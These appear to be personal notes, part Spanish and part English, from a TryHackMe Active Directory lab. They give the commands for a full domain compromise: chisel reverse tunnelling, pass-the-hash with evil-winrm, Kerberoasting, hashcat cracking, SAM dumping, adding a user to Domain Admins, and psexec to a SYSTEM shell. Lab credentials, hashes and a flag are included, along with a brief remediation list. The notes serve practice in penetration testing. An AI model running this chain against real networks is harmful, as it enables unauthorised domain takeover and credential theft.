# Creamos un tunel con la herramienta chisel

# Se ejecuta en la maquina del atacante

- chisel server --reverse -p 4455 

# En la maquina pivoting vamos a reenviar el trafico

- evil-winrm -i 10.200.150.20 -u 'Administrator' -H 'd69046613a718ce6cc7ea9e3d5a5fcde'                      

- chisel.exe client 10.250.1.6:4455 R:socks

# Configuracion de Chisel 
- sudo nano /etc/proxychains4.conf 
            socks5 127.0.0.1 1080


# Con rpcclient vamos a listar los usuario.

- proxychains4 rpcclient -U 'John%VerySafePassword!' 10.200.150.10 

- - enumdomusers 

# Lista de Usuarios obtenidos
Administrator
Guest
m.martin
g.duncan
j.phillips


# Se realizó kerberoas y 

- proxychains4 impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword! -request

# Se obtine el hash para el usuario j.phillips

$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$cae688bbe754e76dbc01b3934b1581e5$ef4150cb3da787af1fc09aa1060852f2e82c4870d7d30e2b2c119d3ba112c952fcc7feb96fd0a15bfc260583768aab211d9e7a99d1c9c80bd23d9f82a53a987d6b1396fcee549f03619067635f97b55126d174411cff93727f82280e1207b9733b925ac1c60606bbf90d9e99c38a0ed0ff94378cb86225774be928817a7ac3362e140a795f356e103963b67151d2ccf646fb4c461884f6024f9ffe4363bf1dd79b742611ff648eb0721cff1d9324367082f5f3c01a25fc4ebb0f052b495bbf249b63143f2b05af9ffa2626c771b298bc57392a93e2a9e95df3085d4e9c591522b4aab32b1ae9b6b8670e95c79d970cb5f91643a60f1dc7782ac2a735ddf0a95d08a43690c52345a7e0cf97c93247146a159301807903b0224b01d45d116550f54444622e7fceba2f00dfc3ef9de65c132497ee0944be7276f88c650216dd33037013191eee29a7e16afa97ee7c5f79400dc8d49b42df5d5c5f194060abe7954651e509be6bad35a4eed728867d2d126fbdc6586b5e3fcff05680104729b0c62642bb499a169ccc6e326f057aa991f1455770162405206550363a0e9e582fbd38a60e7a32134a50a3632c4755abbc76972c6914771819ca5d5951a663b5eda80b285a34725b6cb3b3f253269ab2d79a7d771b457af27de06bf77c9214138ddaa144560810f9709a2b02790156f7f959135e78812b3f6942c60bead154c5b1a3dbcc64a9a398f42c6e6b993e630eb852d573222a7fba71956be9e7a4de29b7bde39827714910359443b582c93c5d1d9110b5b2e26ca550e4b4043e4a25dba5749b85a7429800159442fd7f79804ce329623449965fdf0ece0278c5195c359e927e199981caf018701ab9a74abda0e82e9712751b26787b15e18e00e16590ae6cdb918dac617414f2f83e294508c915a7958d14ced15cbe058fb6e2712b53c17ada37e4300f8121fd220f28015cbf9145273bd296ba351dc668c28e62701fe3eb44373708a1646461b2ab873465b0e7d5b0cb9c5d8966eb28310734c1839def0023fb4c04193c2381baaca72ddddb40bd43b446552618c0d158ef807f8b14df7ebc53f7529230e85f4460b9250eb914ebbbe2024436308545b7baa5c456ec6dce51e92d0d54bcc88de6ebbbe95951ffea966b0c44b8ac0f2954c60acef01f7759d3b669efddb3e987af7de933c82157af8eebf52cf2c54ed1c08dee500f644dac2245460df94004f0b40ea1f342571e9ba6c162d9e8d3f1652689debe1383abb6ed008da7b9ab5085c35ae40114cae092ac51810ab1ba5fc3900b4fea178308d2be467a0a87e92f47




# Se obtine la constrasena con hashcat
hashcat -m 13100 -a 0 hashjphillis.txt /usr/share/wordlists/rockyou.txt 

# La constrasena obtenida para el usuario  j.phillips:Welcome1
j.phillips:Welcome1

# Se añade al usuario j.phillips al grupo “Domain Admins”.

- proxychains net rpc group addmem "Domain Admins" j.phillips -U 'dc.tryhackme.loc/j.phillips%Welcome1' -S 10.200.150.10
                                                                                                                                                                                                                                                            
# Abre una shell remota (SYSTEM) en el DC usando psexec.                                                                    
- proxychains impacket-psexec tryhackme.loc/j.phillips:'Welcome1'@10.200.150.10


# La bandera Obtenida 
C:\> type flag.txt
THM{dfc7764c-e62e-4811-a017-f65152266f47}

















-----------------------------------


Attack Path:
Discovered and cracked creds.zip (password: Passw0rd ) in SMB, smbclient
\\\\10.200.150.20\\Safe.
Got username password for john:VerySafePassword! in the creds.zip .
Used evil-winrm with credentials ( john:VerySafePassword! ).
Using whoami /all found out SeBackupPrivilege enabled for john.


using reg save hklm\sam C:\Windows\Temp\sam , reg save hklm\system C:\Windows\Temp\system
backup the SAM, SYSTEM file.
Use secretsdump.py -sam sam -system system LOCAL and get the local administrator
hash.
Using evilwinrm -i 10.200.20 -u administrator -H '7588e253753ab8b09c99a3d8f58b0b9d' and
gained local administrator access and extracted AD-WRK flag.
Remediation:
Lock SMB Shares
Remove SeBackupPrivilege from standard users
Enforce strong password policies.
Restrict SMB shares and disable password-protected zips in sensitive
shares.
Monitor failed login attempts and brute-force activities


Bloodhound shows us j.phillips user is kerberoastable.
Log in wrk.tryhackme.loc machine using local administrator creds. evilwinrm
-i 10.200.20 -u administrator -H '7588e253753ab8b09c99a3d8f58b0b9d'
Start pivoting using chisel . . /chisel server -p 8000 --reverse #on kali
.\chisel client <kali ip:8000> R:socks #on wrk.tryhackme.loc machine
Conducted Kerberoasting ( proxychains GetUserSPNs.py
'tryhackme.loc/john:VerySafePassword!' -dc-ip 10.200.150.10 -request ) to obtain j.phillips krb5tgs
hash.
Cracked hash with hashcat -m 13100 -a 0 hash.txt rockyou.txt , added j.phillips to
Domain Admins proxychains net rpc group addmem "Domain Admins" j.phillips -U
'dc.tryhackme.loc/j.phillips%Welcome1' -S 10.200.150.10
Using proxychains psexec.py tryhackme.loc/j.phillips:'Welcome1'@10.200.150.10 we got the
access to the DC and get the .